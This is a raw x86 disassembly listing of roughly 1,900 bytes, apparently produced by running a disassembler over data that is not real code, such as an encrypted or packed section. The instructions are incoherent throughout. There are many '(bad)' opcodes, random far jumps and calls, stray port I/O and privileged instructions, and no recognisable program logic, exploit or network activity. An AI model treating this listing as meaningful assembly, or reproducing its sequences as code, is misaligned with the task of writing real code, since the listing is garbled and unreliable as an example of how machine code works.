  407a27:	cmp    eax,0x1cbe1316
  407a2c:	mov    esp,0xc0fcba46
  407a31:	arpl   WORD PTR [edx-0x177153d7],di
  407a37:	stos   DWORD PTR es:[edi],eax
  407a38:	stc    
  407a39:	pop    ss
  407a3a:	cdq    
  407a3b:	mov    edi,0x4256767b
  407a40:	ret    
  407a41:	inc    esp
  407a42:	repnz mov ah,0x41
  407a45:	xor    al,0x7b
  407a47:	retf   
  407a48:	xor    DWORD PTR [esi+esi*2-0x2c4273d1],esp
  407a4f:	lods   al,BYTE PTR ds:[esi]
  407a50:	popa   
  407a51:	dec    ebp
  407a52:	(bad)  
  407a53:	mov    ecx,0xbec7d23c
  407a58:	xor    BYTE PTR [eax-0x4704d021],al
  407a5e:	inc    ecx
  407a5f:	stos   BYTE PTR es:[edi],al
  407a60:	retf   0x8269
  407a63:	cmp    BYTE PTR [eax+0x5384d5a9],al
  407a69:	ret    0x6a4c
  407a6c:	xor    eax,0x8de745af
  407a71:	es dec ebx
  407a73:	sbb    al,BYTE PTR [edi+ebp*4+0x6f9a128c]
  407a7a:	and    al,0xe8
  407a7c:	addr16 xchg edx,eax
  407a7e:	push   esi
  407a7f:	mov    ebp,0x7fc1c2c4
  407a84:	mov    al,0xcc
  407a86:	stos   DWORD PTR es:[edi],eax
  407a87:	inc    eax
  407a88:	bound  ebx,QWORD PTR [edx+ebp*2]
  407a8b:	fisub  DWORD PTR [edi+eax*1]
  407a8e:	adc    edi,DWORD PTR [eax+0x32]
  407a91:	(bad)  
  407a93:	test   al,0x83
  407a95:	sti    
  407a96:	aas    
  407a97:	add    al,0xfa
  407a99:	jg     0x407a35
  407a9b:	cli    
  407a9c:	aas    
  407a9d:	in     al,0x81
  407a9f:	ja     0x407a6a
  407aa1:	repnz sub DWORD PTR [ebx+0x19b0bad9],eax
  407aa8:	xlat   BYTE PTR es:[ebx]
  407aaa:	cmp    al,0x56
  407aac:	in     eax,dx
  407aad:	pop    ecx
  407aae:	int3   
  407aaf:	in     eax,dx
  407ab0:	inc    eax
  407ab1:	xor    ebx,DWORD PTR [edx-0x4]
  407ab4:	popf   
  407ab5:	test   eax,0x5dd1edea
  407abb:	mov    edi,0x3b45ce94
  407ac0:	mov    bh,0xf2
  407ac2:	enter  0x64f9,0x11
  407ac6:	dec    ebp
  407ac7:	sar    DWORD PTR [eax-0x37f05387],0xa4
  407ace:	shl    BYTE PTR [edi+0x48],1
  407ad1:	loope  0x407a84
  407ad3:	shr    DWORD PTR [ecx],cl
  407ad5:	pop    ebx
  407ad6:	xlat   BYTE PTR ds:[ebx]
  407ad7:	mov    edx,0x84ae2d66
  407adc:	jecxz  0x407b4a
  407ade:	mov    ah,dl
  407ae0:	mov    fs,WORD PTR [ebx]
  407ae2:	and    eax,0x421a843
  407ae7:	aad    0x56
  407ae9:	add    bh,cl
  407aeb:	add    esp,esp
  407aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aee:	xchg   ebp,eax
  407aef:	add    al,0xdd
  407af1:	inc    ebp
  407af2:	ja     0x407b37
  407af4:	jl     0x407ab0
  407af6:	scas   eax,DWORD PTR es:[edi]
  407af7:	mov    ch,0xb1
  407af9:	mov    BYTE PTR [eax+0xd],cl
  407afc:	xchg   edi,eax
  407afd:	pop    ss
  407afe:	pop    ss
  407aff:	scas   eax,DWORD PTR es:[edi]
  407b00:	pop    edi
  407b01:	clc    
  407b02:	jp     0xd0f5079
  407b08:	adc    eax,0xfd39fb39
  407b0d:	leave  
  407b0e:	xchg   edi,eax
  407b0f:	lock xchg edi,eax
  407b11:	mov    esp,0xb1de6de9
  407b16:	fwait
  407b17:	pushf  
  407b18:	(bad)  
  407b19:	hlt    
  407b1a:	inc    ecx
  407b1b:	or     BYTE PTR [edi],dh
  407b1d:	call   0xa815:0xe7a1ff72
  407b24:	loope  0x407add
  407b26:	sahf   
  407b27:	inc    ecx
  407b28:	(bad)  
  407b29:	cmc    
  407b2a:	in     al,0x3f
  407b2c:	inc    edx
  407b2d:	lods   eax,DWORD PTR ds:[esi]
  407b2e:	inc    ebx
  407b2f:	ret    
  407b30:	fs jle 0x407b45
  407b33:	popa   
  407b34:	pop    esi
  407b35:	ffree  st(6)
  407b37:	(bad)  
  407b38:	pop    ds
  407b39:	lods   eax,DWORD PTR ds:[esi]
  407b3a:	addr16 sub ecx,esi
  407b3d:	and    al,0x9d
  407b3f:	loop   0x407adc
  407b41:	cmp    cl,BYTE PTR [ebp+0x67eab22d]
  407b47:	lods   al,BYTE PTR ds:[esi]
  407b48:	and    bh,ah
  407b4a:	sub    ebp,ebp
  407b4c:	sub    DWORD PTR [esi+0x42108f8],esi
  407b52:	fwait
  407b53:	loopne 0x407bd1
  407b55:	push   DWORD PTR [ecx]
  407b57:	push   edx
  407b58:	cs fucomip st,st(4)
  407b5b:	push   ebx
  407b5c:	add    BYTE PTR [eax+0x78],ah
  407b5f:	mov    dl,0x48
  407b61:	xchg   ebx,eax
  407b62:	mov    bl,0x35
  407b64:	daa    
  407b65:	xchg   ecx,eax
  407b66:	push   ds
  407b67:	js     0x407b91
  407b69:	push   ecx
  407b6a:	xor    bl,BYTE PTR [esi-0x3726f3e5]
  407b70:	cmp    cl,BYTE PTR [ebx]
  407b72:	shrd   DWORD PTR [eax],esp,cl
  407b75:	retf   0x6ca9
  407b78:	xor    eax,0xaf5f0458
  407b7d:	test   eax,0x57d750c5
  407b82:	mov    edx,0xe504835
  407b87:	dec    esi
  407b88:	push   ecx
  407b89:	mov    esp,0x6f9faae8
  407b8e:	push   0x32f5e9a7
  407b93:	add    BYTE PTR [edx-0x8],dl
  407b96:	sub    eax,0x3bf47f85
  407b9b:	jmp    0x407b63
  407b9d:	lods   eax,DWORD PTR ds:[esi]
  407b9e:	test   BYTE PTR [edi+0x17db1db8],bh
  407ba4:	dec    ebx
  407ba5:	inc    edx
  407ba6:	div    esi
  407ba8:	or     eax,0xc4d0a08e
  407bad:	ficomp DWORD PTR [ecx+eiz*8-0x6c]
  407bb1:	mov    ah,0x29
  407bb3:	jb     0x407b9b
  407bb5:	xchg   edi,eax
  407bb6:	adc    eax,0xafca4101
  407bbb:	jae    0x407bcc
  407bbd:	mov    bl,BYTE PTR [eax+0x66]
  407bc0:	add    eax,0x3e237f86
  407bc5:	jb     0x407b60
  407bc7:	push   cs
  407bc8:	push   cs
  407bc9:	xchg   edi,eax
  407bca:	mov    ds:0x63568437,al
  407bcf:	iret   
  407bd0:	push   edi
  407bd1:	sub    eax,0xfc539ca4
  407bd6:	mov    cl,0xcf
  407bd8:	xlat   BYTE PTR ds:[ebx]
  407bd9:	pop    edx
  407bda:	jne    0x407c54
  407bdc:	and    BYTE PTR [ebp+0x70],bl
  407bdf:	adc    DWORD PTR [esi],edi
  407be1:	mov    esp,0x5f8cd57b
  407be6:	or     ch,BYTE PTR [edi-0xdfdfced]
  407bec:	cmp    eax,0xa35e3277
  407bf1:	fwait
  407bf2:	xor    eax,0xd1626829
  407bf7:	push   ebp
  407bf8:	lea    edx,[ebx+0x5ace6480]
  407bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bff:	fstp   DWORD PTR [eax]
  407c01:	mov    ch,0xbb
  407c03:	call   0xbb2fa36c
  407c08:	jmp    0xab60e83
  407c0d:	mov    bh,0x9b
  407c0f:	imul   edx,DWORD PTR [ebp+0x2fa59f87],0xdcdcc13c
  407c19:	push   0xffffffd8
  407c1b:	push   0xa85d552f
  407c20:	dec    ebx
  407c21:	push   0xffffffd7
  407c23:	das    
  407c24:	mov    edi,DWORD PTR [edi+0x5d2de7a6]
  407c2a:	xchg   ebx,eax
  407c2b:	or     dl,BYTE PTR [ecx+0x7d]
  407c2e:	loopne 0x407bf9
  407c30:	xchg   ecx,eax
  407c31:	push   edx
  407c32:	outs   dx,DWORD PTR ds:[esi]
  407c33:	jmp    0x407bc9
  407c35:	in     al,dx
  407c36:	das    
  407c37:	pushf  
  407c38:	cmc    
  407c39:	dec    edx
  407c3a:	test   eax,0xd38fb72d
  407c3f:	jge    0x407bd1
  407c41:	and    al,0xc3
  407c43:	pop    ebp
  407c44:	xchg   ebx,eax
  407c45:	xchg   edx,eax
  407c46:	inc    ebp
  407c47:	into   
  407c48:	or     al,0x1b
  407c4a:	push   ecx
  407c4b:	in     al,0x65
  407c4d:	xor    DWORD PTR [ebp-0x3f],edx
  407c50:	sub    eax,0xb2948cfc
  407c55:	or     al,0x16
  407c57:	leave  
  407c58:	cs loopne 0x407c77
  407c5b:	inc    eax
  407c5c:	inc    esi
  407c5d:	jle    0x407c81
  407c5f:	shl    DWORD PTR [edi+ebx*8+0x26c96214],1
  407c66:	cwde   
  407c67:	or     ebp,ecx
  407c69:	jnp    0x407ce6
  407c6b:	int    0x3e
  407c6d:	fldcw  WORD PTR [ecx+0xaceba46]
  407c73:	cmc    
  407c74:	mov    WORD PTR [eax-0x70985912],ds
  407c7a:	pop    ebp
  407c7b:	cld    
  407c7c:	ss dec ecx
  407c7e:	mov    fs,WORD PTR [edx+eax*1+0x3f]
  407c82:	pop    ds
  407c83:	jbe    0x407c79
  407c85:	pop    ebp
  407c86:	jp     0x407c0b
  407c88:	sbb    BYTE PTR [eax-0x177c2aa],dl
  407c8e:	les    ecx,FWORD PTR [ebp-0x66]
  407c91:	xor    al,BYTE PTR [edi-0x7d984f0a]
  407c97:	xchg   ebp,eax
  407c98:	xor    al,dh
  407c9a:	loopne 0x407d0c
  407c9c:	mov    ds,WORD PTR [edx+0x13002a1d]
  407ca2:	addr16 std 
  407ca4:	adc    eax,DWORD PTR [edx+0x4b]
  407ca7:	jbe    0x407c46
  407ca9:	sbb    BYTE PTR es:[ecx],0xde
  407cad:	mov    dl,0x1
  407caf:	(bad)  
  407cb0:	stc    
  407cb1:	daa    
  407cb2:	jecxz  0x407c7d
  407cb4:	fidiv  WORD PTR [ebp-0x2550f1ae]
  407cba:	dec    ecx
  407cbb:	push   0x21368d72
  407cc0:	mul    edx
  407cc2:	push   esi
  407cc3:	stos   DWORD PTR es:[edi],eax
  407cc4:	stc    
  407cc5:	jmp    0x9d2a:0x968e7c49
  407ccc:	lods   eax,DWORD PTR ds:[esi]
  407ccd:	dec    ecx
  407cce:	mov    bh,BYTE PTR [ecx+0x61]
  407cd1:	out    0x28,eax
  407cd3:	and    ch,BYTE PTR [ebx]
  407cd5:	mov    ebx,0x4dff3c0a
  407cda:	nop
  407cdb:	mov    edi,0xeeb3dc62
  407ce0:	daa    
  407ce1:	lds    edx,FWORD PTR [edx-0x642293c9]
  407ce7:	xor    DWORD PTR [ebp+0x23],ecx
  407cea:	and    eax,0x1de4f3c2
  407cef:	push   esp
  407cf0:	loop   0x407cc4
  407cf2:	cli    
  407cf3:	mov    edi,DWORD PTR [edi]
  407cf5:	fdivr  DWORD PTR [ecx]
  407cf7:	pushf  
  407cf8:	jge    0x407d43
  407cfa:	dec    eax
  407cfb:	sub    eax,0xf4deddb2
  407d00:	pop    ss
  407d01:	dec    edi
  407d02:	mov    ds:0x57c10021,eax
  407d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d08:	mov    esp,ecx
  407d0a:	out    0x5f,al
  407d0c:	cmp    ah,dh
  407d0e:	test   BYTE PTR [ebp+0x5b640657],0x19
  407d15:	add    edi,DWORD PTR [eax+ebx*2]
  407d18:	mov    ds:0xc5f11c25,al
  407d1d:	ins    BYTE PTR es:[edi],dx
  407d1e:	mov    ecx,0x4396e29e
  407d23:	or     cl,BYTE PTR [ecx+0x3c]
  407d26:	imul   eax,DWORD PTR [edi-0x1926231],0x2c
  407d2d:	dec    ecx
  407d2e:	ja     0x407d4c
  407d30:	gs aas 
  407d32:	dec    ecx
  407d33:	(bad)  
  407d34:	ins    DWORD PTR es:[edi],dx
  407d35:	daa    
  407d36:	dec    esi
  407d37:	mov    edi,0x769d0ca9
  407d3c:	jnp    0x407d03
  407d3e:	mov    bh,0x4d
  407d40:	rcr    BYTE PTR [edx-0x7759b513],1
  407d46:	arpl   cx,bp
  407d48:	jle    0x407d46
  407d4a:	popa   
  407d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d4c:	scas   eax,DWORD PTR es:[edi]
  407d4d:	xchg   ecx,eax
  407d4e:	ror    dl,1
  407d50:	aaa    
  407d51:	cmp    edx,DWORD PTR [edx-0x32]
  407d54:	xor    cl,bl
  407d56:	dec    esi
  407d57:	cmp    BYTE PTR [eax-0x239ac622],bh
  407d5d:	mov    ch,0x2e
  407d5f:	xchg   esp,eax
  407d60:	fcomi  st,st(7)
  407d62:	cwde   
  407d63:	out    dx,eax
  407d64:	aad    0xbf
  407d66:	jmp    0x407d18
  407d68:	or     eax,0x295da711
  407d6d:	fsub   st(3),st
  407d6f:	pop    ds
  407d70:	cmc    
  407d71:	les    esi,FWORD PTR [edx]
  407d73:	xchg   ebp,eax
  407d74:	sar    DWORD PTR [eax-0x65],1
  407d77:	mov    bh,bh
  407d79:	loope  0x407d75
  407d7b:	xchg   DWORD PTR es:[edx+eiz*1+0x2357358a],edx
  407d83:	fsub   QWORD PTR [edi-0x6dbcee4c]
  407d89:	leave  
  407d8a:	mov    edi,ecx
  407d8c:	xor    ecx,esi
  407d8e:	jno    0x407d74
  407d90:	push   edx
  407d91:	or     ecx,0xffffffb0
  407d94:	mov    ecx,DWORD PTR [esp+eiz*8-0x2ec5668]
  407d9b:	arpl   di,si
  407d9d:	fbld   TBYTE PTR [ecx+0x79]
  407da0:	outs   dx,DWORD PTR ds:[esi]
  407da1:	jg     0x407db5
  407da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da4:	and    al,0xc3
  407da6:	repz sbb DWORD PTR [ecx+0x62],edx
  407daa:	sbb    BYTE PTR [eax+0x60],bl
  407dad:	jmp    0x407e23
  407daf:	out    0x87,al
  407db1:	les    ebx,FWORD PTR [esi]
  407db3:	adc    BYTE PTR [edi+esi*1-0x8],0x64
  407db8:	adc    BYTE PTR [edi+0x73bca017],dl
  407dbe:	dec    ebx
  407dbf:	xor    al,0x1e
  407dc1:	mov    ch,0x66
  407dc3:	retf   
  407dc4:	jl     0x407e0d
  407dc6:	jp     0x407dc7
  407dc8:	push   edx
  407dc9:	pop    esi
  407dca:	add    dl,bh
  407dcc:	(bad)  
  407dcd:	push   cs
  407dce:	gs lock push es
  407dd1:	add    cl,dh
  407dd3:	cdq    
  407dd4:	fild   DWORD PTR ds:[eax+0x430cd3b8]
  407ddb:	inc    esp
  407ddc:	retf   
  407ddd:	cs std 
  407ddf:	sbb    BYTE PTR [edi-0x68],0x3b
  407de3:	inc    ebx
  407de4:	imul   ebp,esi,0x9bc128b0
  407dea:	js     0x407e41
  407dec:	pop    ecx
  407ded:	sbb    dh,BYTE PTR [edi+0xa7326b5]
  407df3:	pop    ds
  407df4:	mov    ds,WORD PTR [ebx-0x3]
  407df7:	xor    al,0x4c
  407df9:	cli    
  407dfa:	sbb    BYTE PTR [esi],0x64
  407dfd:	(bad)  
  407dfe:	sahf   
  407dff:	or     cl,BYTE PTR [eax+eiz*8-0x2]
  407e03:	jns    0x407d8e
  407e05:	arpl   WORD PTR [bx+di+0x6d2c],ax
  407e0a:	in     eax,dx
  407e0b:	dec    edi
  407e0c:	pop    ss
  407e0d:	cdq    
  407e0e:	adc    eax,ebp
  407e10:	inc    edx
  407e11:	(bad)  
  407e14:	jae    0x407e0c
  407e16:	and    eax,0x64354118
  407e1b:	popa   
  407e1c:	test   DWORD PTR [edi-0x30],0x315f3e4e
  407e23:	mov    eax,edi
  407e25:	dec    ebx
  407e26:	sub    DWORD PTR [ebp+0x4a],esp
  407e29:	mov    BYTE PTR [ecx],dl
  407e2b:	lea    edx,[edi-0x671ecf24]
  407e31:	push   ecx
  407e32:	inc    edx
  407e33:	jne    0x407e56
  407e35:	out    dx,eax
  407e36:	scas   al,BYTE PTR es:[edi]
  407e37:	ins    DWORD PTR es:[edi],dx
  407e38:	sub    eax,0xf493e28
  407e3d:	xor    eax,0x6fb8fc3c
  407e42:	xor    al,0x77
  407e44:	pushf  
  407e45:	in     al,0xee
  407e47:	in     al,0x13
  407e49:	add    eax,0xe5b8c786
  407e4e:	(bad)  
  407e4f:	sar    bl,1
  407e51:	daa    
  407e52:	dec    DWORD PTR [edx+0x22]
  407e55:	and    eax,DWORD PTR es:[eax+0x274c9c05]
  407e5c:	int    0xe1
  407e5e:	mov    ebp,0x613fb7af
  407e63:	fs das 
  407e65:	pop    esp
  407e66:	ret    0x8e0f
  407e69:	fcom   DWORD PTR [ecx-0x53]
  407e6c:	std    
  407e6d:	xor    edi,DWORD PTR [ebx+ecx*8+0x75]
  407e71:	pop    di
  407e73:	test   al,al
  407e75:	shl    DWORD PTR [eax-0x7892c52c],cl
  407e7b:	pop    esp
  407e7c:	aam    0x42
  407e7e:	xchg   esp,eax
  407e7f:	mov    ds:0xe848cb21,al
  407e84:	arpl   bx,di
  407e86:	xlat   BYTE PTR ds:[ebx]
  407e87:	cmp    DWORD PTR [esi+0x6d],esi
  407e8a:	loopne 0x407f07
  407e8c:	xor    eax,0x5fa68d53
  407e91:	fldenv [ebp+0x1deb8011]
  407e97:	xchg   esi,eax
  407e98:	inc    ebp
  407e99:	cmp    eax,0x1eac9791
  407e9e:	cld    
  407e9f:	jg     0x407e98
  407ea1:	mov    WORD PTR [ecx+0x33],?
  407ea4:	lock shr edx,0x20
  407ea8:	and    ebx,DWORD PTR [edx-0x37]
  407eab:	ret    0xc8c3
  407eae:	je     0x407efe
  407eb0:	int    0x75
  407eb2:	test   al,0xfe
  407eb4:	or     al,BYTE PTR [esi+0x4e614c70]
  407eba:	nop
  407ebb:	or     al,0xef
  407ebd:	into   
  407ebe:	dec    esi
  407ebf:	out    dx,eax
  407ec0:	rcr    al,cl
  407ec2:	mov    ebp,0x1a79bd23
  407ec7:	pushf  
  407ec8:	mov    ebp,0x9b56e871
  407ecd:	std    
  407ece:	stc    
  407ecf:	ror    BYTE PTR [ecx],1
  407ed1:	sub    edi,DWORD PTR [eax]
  407ed3:	push   esp
  407ed4:	dec    esp
  407ed5:	sub    al,0x12
  407ed7:	and    BYTE PTR [eax-0x13],0xa7
  407edb:	int3   
  407edc:	jge    0x407f15
  407ede:	jp     0x407eff
  407ee0:	lods   eax,DWORD PTR ds:[esi]
  407ee1:	xor    dh,BYTE PTR [edi]
  407ee3:	mov    al,ds:0xfd37ad6f
  407ee8:	mul    DWORD PTR [edi+0x4e]
  407eeb:	push   ebx
  407eec:	pushf  
  407eed:	(bad)  
  407eee:	mov    ah,0x55
  407ef0:	mov    edx,0x1a983bc5
  407ef5:	stc    
  407ef6:	jecxz  0x407edf
  407ef8:	jmp    0xc0c6:0x26ef6477
  407eff:	and    DWORD PTR [edi],ebx
  407f01:	vmread DWORD PTR [ecx+0x4b],edx
  407f05:	or     al,0x34
  407f07:	loope  0x407e9d
  407f09:	cmp    ch,BYTE PTR [esi-0x1a]
  407f0c:	pop    ecx
  407f0d:	gs mov esp,0xa14e95c6
  407f13:	pop    edx
  407f14:	mov    ebx,0xd3cac02d
  407f19:	(bad)  
  407f1a:	and    DWORD PTR [edx-0x663451b9],edi
  407f20:	dec    edi
  407f21:	in     eax,dx
  407f22:	popa   
  407f23:	cs mov bh,bh
  407f26:	sbb    eax,0x298f9756
  407f2b:	inc    eax
  407f2c:	cwde   
  407f2d:	and    eax,0x97848d0f
  407f32:	(bad)  
  407f33:	push   cs
  407f34:	push   es
  407f35:	sbb    eax,0x9b11c8c5
  407f3a:	xor    eax,0xb4b36715
  407f3f:	(bad)  
  407f41:	push   ecx
  407f42:	cld    
  407f43:	push   ds
  407f44:	pop    edi
  407f45:	lds    ecx,FWORD PTR [eax]
  407f47:	sub    BYTE PTR [edx-0x80],cl
  407f4a:	icebp  
  407f4b:	mov    ss,WORD PTR [edi+0x16]
  407f4e:	pop    ss
  407f4f:	push   eax
  407f50:	sar    BYTE PTR [edx+edx*2-0x50dd2ca3],0xfc
  407f58:	push   eax
  407f59:	sub    BYTE PTR [esi-0x421ed8f5],bh
  407f5f:	dec    DWORD PTR [edx+eiz*4+0x55]
  407f63:	std    
  407f64:	mov    dh,0x7b
  407f66:	lods   al,BYTE PTR ds:[esi]
  407f67:	push   esi
  407f68:	imul   esi,DWORD PTR [edx-0x5f],0x18
  407f6c:	xchg   BYTE PTR [edx],cl
  407f6e:	test   al,0x94
  407f70:	hlt    
  407f71:	pop    es
  407f72:	int3   
  407f73:	xor    al,0xe3
  407f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f76:	cmp    bl,BYTE PTR [esi]
  407f78:	mov    esp,0x1a5518a4
  407f7d:	xchg   esi,eax
  407f7e:	xlat   BYTE PTR ds:[ebx]
  407f7f:	jbe    0x407fae
  407f81:	xchg   edx,eax
  407f82:	inc    ebp
  407f83:	cmp    BYTE PTR [esi-0x21cb04f0],0x18
  407f8a:	das    
  407f8b:	mov    ecx,0x42e3d05b
  407f90:	push   0x75a975a2
  407f95:	repnz outs dx,DWORD PTR ds:[esi]
  407f97:	push   es
  407f98:	and    edx,DWORD PTR [ebp+0x55]
  407f9b:	mov    ah,BYTE PTR [eax]
  407f9d:	xor    DWORD PTR [edi+0x5218c6a4],edx
  407fa3:	jmp    0x3e8f:0x3320d254
  407faa:	sub    DWORD PTR [edx],ebx
  407fac:	in     al,dx
  407fad:	inc    bx
  407faf:	mov    esp,0x29d04f05
  407fb4:	sbb    edx,DWORD PTR [ebp+0x92ef2ec]
  407fba:	push   0x74bf71c
  407fbf:	jge    0x407f42
  407fc1:	xlat   BYTE PTR ds:[bx]
  407fc3:	or     eax,0x4e85647d
  407fc8:	mov    dl,0x39
  407fca:	sub    eax,0x1f66f422
  407fd0:	ds push ecx
  407fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd3:	scas   eax,DWORD PTR es:[edi]
  407fd4:	xor    DWORD PTR [edi],0xffffff96
  407fd7:	mov    edi,0xa6500fc5
  407fdc:	fnstsw WORD PTR [eax+0x376c7bea]
  407fe2:	hlt    
  407fe3:	shl    bl,0xd
  407fe6:	mov    dl,0x39
  407fe8:	rol    DWORD PTR [ecx-0x62],0x83
  407fec:	xchg   ebx,eax
  407fed:	xchg   edi,eax
  407fee:	data16 test BYTE PTR [edi-0x7c],bl
  407ff2:	ins    BYTE PTR es:[edi],dx
  407ff3:	fsub   QWORD PTR [ebx+0x7b]
  407ff6:	dec    esi
  407ff7:	cmp    eax,0xdb1c74a5
  407ffc:	lock xor BYTE PTR [ecx],cl
  407fff:	cli    
  408000:	mov    al,ds:0x5bd00a5e
  408005:	repz or DWORD PTR [ecx],edx
  408008:	sbb    ah,BYTE PTR [ecx-0x1b]
  40800b:	mov    ds:0x1d4f1c0d,al
  408010:	add    BYTE PTR [edi+0x34],al
  408013:	and    ch,BYTE PTR [ebp+ecx*2+0x3c5ebdb0]
  40801a:	inc    esi
  40801b:	lahf   
  40801c:	push   esi
  40801d:	arpl   di,sp
  40801f:	jb     0x40800d
  408021:	scas   eax,DWORD PTR es:[edi]
  408022:	test   DWORD PTR [edx],ecx
  408024:	fadd   st(6),st
  408026:	or     ebx,esi
  408028:	cwde   
  408029:	ror    DWORD PTR [esi],cl
  40802b:	pusha  
  40802c:	add    DWORD PTR [eax],esp
  40802e:	pusha  
  40802f:	(bad)  
  408031:	cli    
  408032:	pushf  
  408033:	xor    DWORD PTR [ebx-0x33aa8e04],esp
  408039:	nop
  40803a:	push   es
  40803b:	lods   eax,DWORD PTR ds:[esi]
  40803c:	pop    ebx
  40803d:	in     eax,dx
  40803e:	stos   BYTE PTR es:[edi],al
  40803f:	push   0x36
  408041:	push   ecx
  408042:	icebp  
  408043:	(bad)  
  408044:	scas   eax,DWORD PTR es:[edi]
  408045:	or     bh,dl
  408047:	loop   0x408000
  408049:	pop    es
  40804a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40804b:	mov    bl,0xe5
  40804d:	popa   
  40804e:	jo     0x407ffd
  408050:	nop
  408051:	test   BYTE PTR [edi],bh
  408053:	pop    ds
  408054:	jecxz  0x408042
  408056:	xlat   BYTE PTR ds:[ebx]
  408057:	jge    0x408088
  408059:	pop    ss
  40805a:	xchg   ebx,eax
  40805b:	jg     0x40805a
  40805d:	stc    
  40805e:	or     al,0x4c
  408060:	mov    ebx,0x381e675d
  408065:	add    DWORD PTR gs:[edi],esp
  408068:	or     al,0x2
  40806a:	push   esp
  40806b:	lods   eax,DWORD PTR ds:[esi]
  40806c:	cmp    eax,0x76de0bb6
  408071:	xchg   DWORD PTR [ecx-0x42586088],esp
  408077:	sub    DWORD PTR [ebx+0x6d],0x3a17a55b
  40807e:	fadd   DWORD PTR [ecx+0x7c]
  408081:	fld    QWORD PTR [edx]
  408083:	in     al,dx
  408084:	or     esp,0x1c
  408087:	mov    dh,0x9c
  408089:	in     eax,0x82
  40808b:	xchg   eax,edx
  40808d:	push   esi
  40808e:	jp     0x4080d2
  408090:	leave  
  408091:	jg     0x4080a7
  408093:	out    0x2f,eax
  408095:	gs test al,0x39
  408098:	pop    edi
  408099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809a:	icebp  
  40809b:	jp     0x40811a
  40809d:	xor    cl,bh
  40809f:	dec    edi
  4080a0:	daa    
  4080a1:	ds (bad) 
  4080a3:	push   esi
  4080a4:	mov    ss,WORD PTR [esi+0x74]
  4080a7:	push   edi
  4080a8:	inc    esi
  4080a9:	xor    ebp,0x11
  4080ac:	rol    DWORD PTR [ecx],1
  4080ae:	and    BYTE PTR [ebx-0x2],cl
  4080b1:	jne    0x408059
  4080b3:	sub    esp,DWORD PTR [ebp-0x38]
  4080b6:	mov    esp,0x636a7925
  4080bb:	mov    esi,0x9a21c9ed
  4080c0:	xlat   BYTE PTR ds:[ebx]
  4080c1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c3:	push   ecx
  4080c4:	mov    al,0x47
  4080c6:	sub    eax,0x2246d2a1
  4080cb:	int3   
  4080cc:	adc    BYTE PTR [ebp-0x1342f3c9],al
  4080d2:	pop    es
  4080d3:	dec    ebp
  4080d4:	push   edx
  4080d5:	mov    edx,0xd9b1510a
  4080da:	inc    ebp
  4080db:	xchg   DWORD PTR [eax],esp
  4080dd:	out    dx,al
  4080de:	sbb    al,0xe
  4080e0:	es gs jecxz 0x4080ed
  4080e4:	mov    ch,0xe8
  4080e6:	fiadd  WORD PTR [eax]
  4080e8:	jg     0x4080cd
  4080ea:	sub    eax,edi
  4080ec:	jge    0x40808a
  4080ee:	dec    edx
  4080ef:	dec    edi
  4080f0:	das    
  4080f1:	mov    bh,0xb3
  4080f3:	xor    al,0x41
  4080f5:	repnz inc edi
  4080f7:	xor    ah,BYTE PTR [edi-0x32]
  4080fa:	xor    eax,0x1097a357
  4080ff:	sti    
  408100:	sub    al,0xfb
  408102:	lds    esi,FWORD PTR [ebx-0x6d]
  408105:	xchg   ebp,eax
  408106:	imul   edx,DWORD PTR [esi+0x9],0xe71e58d1
  40810d:	inc    eax
  40810e:	inc    ebx
  40810f:	mov    ch,0xc0
  408111:	push   esp
  408112:	int    0x83
  408114:	bound  esi,QWORD PTR [ecx+0x5bb4affd]
  40811a:	daa    
  40811b:	fdivr  st(4),st
  40811d:	push   ebp
  40811e:	fs ins BYTE PTR es:[edi],dx
  408120:	dec    edi
  408121:	sbb    al,al
  408123:	out    dx,al
  408124:	xor    BYTE PTR [eax+0x47],ah
  408127:	mov    cl,0x6c
  40812a:	pop    ecx
  40812b:	jmp    0x80e3:0xd114f4f
  408132:	pop    ebp
  408133:	iret   
  408134:	(bad)  
  408135:	push   ebp
  408136:	jle    0x40813a
  408138:	push   ebp
  408139:	das    
  40813a:	push   ebx
  40813b:	and    al,BYTE PTR [edx+0x58]
  40813e:	in     al,dx
  40813f:	inc    eax
  408140:	test   BYTE PTR [eax+0x5c],cl
  408143:	push   ss
  408144:	mov    ebp,0x69b99039
  408149:	cmp    al,0xc
  40814b:	inc    ebp
  40814c:	sbb    BYTE PTR [ecx-0x12ad7a76],0x86
  408153:	and    al,0x6b
  408155:	repnz imul ebx,DWORD PTR [esi+0x3cec9e8c],0xfffffff6
  40815d:	rol    BYTE PTR [ecx],cl
  40815f:	or     al,0xbd
  408161:	loopne 0x408122
  408163:	jg     0x408173
  408165:	(bad)  
  408166:	xchg   esp,eax
  408167:	aad    0x68
  408169:	jbe    0x40812e
  40816b:	or     DWORD PTR [eax+0x6897a574],0xca136b70
  408175:	retf   0xc60f
  408178:	(bad)  
  408179:	aas    
  40817a:	adc    al,BYTE PTR fs:[edx+0x1dd224a5]
  408181:	arpl   ax,cx
  408183:	shl    BYTE PTR [ebp+0x66],cl
  408186:	xchg   BYTE PTR ds:[esi+edx*4+0x59e9e5be],ch
  40818e:	and    DWORD PTR [eax+ebx*4+0x4f9b992b],eax
  408195:	add    ecx,ebp
  408197:	scas   eax,DWORD PTR es:[edi]
  408198:	xor    BYTE PTR ds:0xa78c3336,cl
  40819e:	pop    esi
  40819f:	out    dx,eax
  4081a0:	jecxz  0x4081d3
  4081a2:	(bad)  
  4081a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a4:	lods   eax,DWORD PTR ds:[esi]
  4081a5:	inc    edi
  4081a6:	adc    BYTE PTR [eax],dl
  4081a8:	data16 sbb ch,BYTE PTR [edx]
  4081ab:	sar    DWORD PTR fs:[edi+0x13],0x8b
  4081b0:	add    eax,0x2cd2ebc5
  4081b5:	or     eax,esp
  4081b7:	sbb    DWORD PTR [ecx-0x13],0xfa4336a6
  4081be:	push   esi
  4081bf:	dec    esp
  4081c0:	mov    eax,?
  4081c2:	push   0x1ac19e12
